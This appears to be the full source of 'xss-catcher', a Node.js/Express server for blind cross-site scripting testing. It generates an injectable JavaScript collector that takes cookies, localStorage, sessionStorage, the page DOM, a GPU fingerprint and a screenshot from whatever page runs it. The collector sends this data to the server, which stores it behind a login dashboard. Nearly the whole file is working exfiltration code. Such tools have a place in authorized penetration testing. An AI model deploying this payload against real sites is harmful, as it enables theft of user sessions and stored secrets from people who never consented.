const express = require('express');
const { DatabaseSync } = require('node:sqlite');
const { randomUUID, randomBytes } = require('crypto');
const path = require('path');
const fs = require('fs');
const https = require('https');

const app = express();

// --- Config: env vars, then CLI flags ---
function cliArg(flags) {
  const argv = process.argv.slice(2);
  for (let i = 0; i < argv.length - 1; i++)
    if (flags.includes(argv[i])) return argv[i + 1];
  return null;
}

const PORT     = cliArg(['--port'])                     || process.env.PORT     || 80;
const HOST     = cliArg(['-H', '--host'])               || process.env.HOST     || '0.0.0.0';
const DB_PATH  =                                           process.env.DB_PATH  || path.join(__dirname, 'captures.db');
const BASE_URL = cliArg(['--base-url'])                 || process.env.BASE_URL || '';
const USER     = cliArg(['-u', '--user'])               || process.env.USER_NAME || '';
const PASS     = cliArg(['-p', '--pass', '--password']) || process.env.PASSWORD  || '';
const CERT     = cliArg(['--cert'])                     || process.env.CERT     || '';
const KEY      = cliArg(['--key'])                      || process.env.KEY      || '';

const TLS = !!(CERT && KEY);
if (CERT && !KEY) { console.error('Error: --cert requires --key'); process.exit(1); }
if (KEY && !CERT) { console.error('Error: --key requires --cert'); process.exit(1); }

if (!USER || !PASS) {
  console.error('Error: username and password are required.');
  console.error('  -u <username>  or  USER_NAME=<username>');
  console.error('  -p <password>  or  PASSWORD=<password>');
  process.exit(1);
}
if (PASS.length < 12) {
  console.error('Error: password must be at least 12 characters.');
  process.exit(1);
}

// --- Database ---
const db = new DatabaseSync(DB_PATH);
db.exec(`
  CREATE TABLE IF NOT EXISTS captures (
    id             TEXT PRIMARY KEY,
    hook           TEXT NOT NULL,
    captured_at    INTEGER NOT NULL,
    ip             TEXT,
    uri            TEXT,
    cookies        TEXT,
    referrer       TEXT,
    user_agent     TEXT,
    origin         TEXT,
    lang           TEXT,
    gpu            TEXT,
    localstorage   TEXT,
    sessionstorage TEXT,
    dom            TEXT,
    screenshot     TEXT
  );
  CREATE INDEX IF NOT EXISTS idx_hook ON captures(hook);
  CREATE INDEX IF NOT EXISTS idx_ts   ON captures(captured_at);
`);

// --- Sessions (in-memory) ---
const sessions = new Set();

function getSessionToken(req) {
  const cookie = req.headers.cookie || '';
  const m = cookie.match(/(?:^|;\s*)xss_session=([a-f0-9]{64})/);
  return m ? m[1] : null;
}

function authenticated(req) {
  const t = getSessionToken(req);
  return t && sessions.has(t);
}

function requireSession(req, res, next) {
  if (authenticated(req)) return next();
  if (req.path.startsWith('/api/')) return res.status(401).json({ error: 'Unauthorized' });
  return res.redirect('/login');
}

// --- Login page (inlined) ---
function loginPage(error) {
  return `<!doctype html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>XSS Catcher</title>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
body{background:#111;color:#e0e0e0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;font-size:14px;display:flex;align-items:center;justify-content:center;min-height:100vh}
.box{width:300px}
h1{font-size:16px;font-weight:600;margin-bottom:20px}
input{display:block;width:100%;height:36px;padding:0 12px;background:#1a1a1a;border:1px solid #2e2e2e;border-radius:4px;color:#e0e0e0;font-size:13px;margin-bottom:10px;outline:none;font-family:inherit}
input:focus{border-color:#4f86f7}
button{width:100%;height:36px;background:#4f86f7;border:none;border-radius:4px;color:#fff;font-size:13px;font-weight:500;cursor:pointer}
button:hover{opacity:.9}
.err{font-size:12px;color:#e05555;margin-top:8px;min-height:18px}
</style>
</head>
<body>
<div class="box">
  <h1>xss-catcher</h1>
  <form method="POST" action="/login">
    <input type="text" name="username" placeholder="Username" autocomplete="username" autofocus required>
    <input type="password" name="password" placeholder="Password" autocomplete="current-password" required>
    <button type="submit">Sign in</button>
    <div class="err">${error || ''}</div>
  </form>
</div>
</body>
</html>`;
}

// --- Body parsers ---
app.use(express.text({ limit: '10mb', type: 'text/plain' }));
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: false }));

// --- Collector script ---
function buildCollectorScript(hook, baseUrl) {
  return `(function(){
var d={};
function s(v){return void 0!==v?v:"";}
function send(){try{var x=new XMLHttpRequest();x.open("POST","${baseUrl}/c/${hook}",true);x.setRequestHeader("Content-type","text/plain");x.send(JSON.stringify(d));}catch(e){}}
try{d.uri=s(location.toString());}catch(e){d.uri="";}
try{d.cookies=s(document.cookie);}catch(e){d.cookies="";}
try{d.referrer=s(document.referrer);}catch(e){d.referrer="";}
try{d["user-agent"]=s(navigator.userAgent);}catch(e){d["user-agent"]="";}
try{d.origin=s(location.origin);}catch(e){d.origin="";}
try{d.lang=s(navigator.language||navigator.userLanguage);}catch(e){d.lang="";}
try{var c=document.createElement("canvas"),g=c.getContext("webgl")||c.getContext("experimental-webgl"),ext=g.getExtension("WEBGL_debug_renderer_info");d.gpu=s(g.getParameter(ext.UNMASKED_RENDERER_WEBGL));}catch(e){d.gpu="";}
try{d.localstorage=JSON.stringify(window.localStorage);}catch(e){d.localstorage="";}
try{d.sessionstorage=JSON.stringify(window.sessionStorage);}catch(e){d.sessionstorage="";}
try{d.dom=s(document.documentElement.outerHTML);}catch(e){d.dom="";}
d.screenshot="";
try{
  var h=document.createElement("script");
  h.src="${baseUrl}/h2c.js";
  h.onload=function(){
    try{
      html2canvas(document.documentElement,{logging:false,allowTaint:true,useCORS:true,scale:0.5,timeout:8000}).then(function(cv){
        try{d.screenshot=cv.toDataURL("image/jpeg",0.75);}catch(e){}
        send();
      }).catch(function(){send();});
    }catch(e){send();}
  };
  h.onerror=function(){send();};
  document.head.appendChild(h);
}catch(e){send();}
})();`.trim();
}

// ── PUBLIC ROUTES (no auth) ───────────────────────────────────────────────

app.get('/h2c.js', (req, res) => {
  res.setHeader('Content-Type', 'application/javascript');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.sendFile(path.join(__dirname, 'node_modules/html2canvas/dist/html2canvas.min.js'));
});

app.get('/c/:hook', (req, res) => {
  const hook = req.params.hook.replace(/[^a-zA-Z0-9_-]/g, '').slice(0, 64);
  const proto = req.headers['x-forwarded-proto'] || req.protocol;
  const base = BASE_URL || `${proto}://${req.headers.host}`;
  res.setHeader('Content-Type', 'application/javascript');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.send(buildCollectorScript(hook, base));
});

app.post('/c/:hook', (req, res) => {
  const hook = req.params.hook.replace(/[^a-zA-Z0-9_-]/g, '').slice(0, 64);
  const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress || '';
  let p = {};
  if (typeof req.body === 'string') { try { p = JSON.parse(req.body); } catch (_) {} }
  else if (req.body && typeof req.body === 'object') { p = req.body; }
  const trunc = (v, n) => String(v || '').slice(0, n);
  db.prepare(`INSERT INTO captures
    (id,hook,captured_at,ip,uri,cookies,referrer,user_agent,origin,lang,gpu,localstorage,sessionstorage,dom,screenshot)
    VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`)
    .run(
      randomUUID(), hook, Date.now(), ip,
      trunc(p.uri, 4096), trunc(p.cookies, 8192), trunc(p.referrer, 2048),
      trunc(p['user-agent'], 512), trunc(p.origin, 512), trunc(p.lang, 64),
      trunc(p.gpu, 256), trunc(p.localstorage, 65536), trunc(p.sessionstorage, 65536),
      trunc(p.dom, 524288), trunc(p.screenshot, 1048576)
    );
  console.log(`[+] ${hook}  ${ip}  ${trunc(p.uri, 80)}`);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.status(200).send('ok');
});

app.options('/c/:hook', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.sendStatus(204);
});

app.get('/login', (req, res) => {
  if (authenticated(req)) return res.redirect('/');
  res.send(loginPage());
});

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  if (username === USER && password === PASS) {
    const token = randomBytes(32).toString('hex');
    sessions.add(token);
    const secure = (TLS || (BASE_URL || '').startsWith('https')) ? '; Secure' : '';
    res.setHeader('Set-Cookie', `xss_session=${token}; HttpOnly; SameSite=Strict; Path=/${secure}`);
    return res.redirect('/');
  }
  res.status(401).send(loginPage('Invalid credentials.'));
});

app.post('/logout', (req, res) => {
  const t = getSessionToken(req);
  if (t) sessions.delete(t);
  res.setHeader('Set-Cookie', 'xss_session=; HttpOnly; SameSite=Strict; Path=/; Max-Age=0');
  res.redirect('/login');
});

// ── PROTECTED ROUTES ─────────────────────────────────────────────────────
app.use(requireSession);

app.get('/api/stats', (req, res) => {
  const now = Date.now();
  const todayStart = new Date(); todayStart.setHours(0,0,0,0);

  const total   = db.prepare('SELECT COUNT(*) AS c FROM captures').get().c;
  const today   = db.prepare('SELECT COUNT(*) AS c FROM captures WHERE captured_at >= ?').get(todayStart.getTime()).c;

  const extractHost = () => `CASE
    WHEN uri GLOB 'https://*' THEN SUBSTR(uri,9,CASE WHEN INSTR(SUBSTR(uri,9),'/')>0 THEN INSTR(SUBSTR(uri,9),'/')-1 ELSE LENGTH(SUBSTR(uri,9)) END)
    WHEN uri GLOB 'http://*'  THEN SUBSTR(uri,8,CASE WHEN INSTR(SUBSTR(uri,8),'/')>0 THEN INSTR(SUBSTR(uri,8),'/')-1 ELSE LENGTH(SUBSTR(uri,8)) END)
    ELSE uri END`;

  const uniqueDomains = db.prepare(`SELECT COUNT(DISTINCT ${extractHost()}) AS c FROM captures WHERE uri != ''`).get().c;

  res.json({ total, today, unique_domains: uniqueDomains });
});

app.get('/api/captures', (req, res) => {
  const hook   = req.query.hook || null;
  const limit  = Math.min(parseInt(req.query.limit) || 50, 200);
  const offset = parseInt(req.query.offset) || 0;
  let rows, total;
  if (hook) {
    rows  = db.prepare('SELECT * FROM captures WHERE hook=? ORDER BY captured_at DESC LIMIT ? OFFSET ?').all(hook, limit, offset);
    total = db.prepare('SELECT COUNT(*) AS c FROM captures WHERE hook=?').get(hook).c;
  } else {
    rows  = db.prepare('SELECT * FROM captures ORDER BY captured_at DESC LIMIT ? OFFSET ?').all(limit, offset);
    total = db.prepare('SELECT COUNT(*) AS c FROM captures').get().c;
  }
  res.json({ total, rows });
});

app.get('/api/captures/:id', (req, res) => {
  const row = db.prepare('SELECT * FROM captures WHERE id=?').get(req.params.id);
  if (!row) return res.status(404).json({ error: 'Not found' });
  res.json(row);
});

app.delete('/api/captures/:id', (req, res) => {
  db.prepare('DELETE FROM captures WHERE id=?').run(req.params.id);
  res.json({ ok: true });
});

app.get('/api/hooks', (req, res) => {
  const rows = db.prepare(
    'SELECT hook, COUNT(*) AS count, MAX(captured_at) AS last_seen FROM captures GROUP BY hook ORDER BY last_seen DESC'
  ).all();
  res.json(rows);
});

app.use(express.static(path.join(__dirname, 'public')));
app.get('*', (_req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));

const proto = TLS ? 'https' : 'http';
const server = TLS
  ? https.createServer({ cert: fs.readFileSync(CERT), key: fs.readFileSync(KEY) }, app)
  : app;

server.listen(PORT, HOST, () => {
  const addr = HOST === '0.0.0.0' ? 'localhost' : HOST;
  console.log(`xss-catcher  ${proto}://${addr}:${PORT}`);
  console.log(`Listening:   ${HOST}:${PORT}  (${TLS ? 'HTTPS' : 'HTTP'})`);
  console.log(`Login:       ${USER} / ${PASS}`);
  console.log(`Collector:   ${BASE_URL || `${proto}://${addr}:${PORT}`}/c/<hook>  (public)`);
});
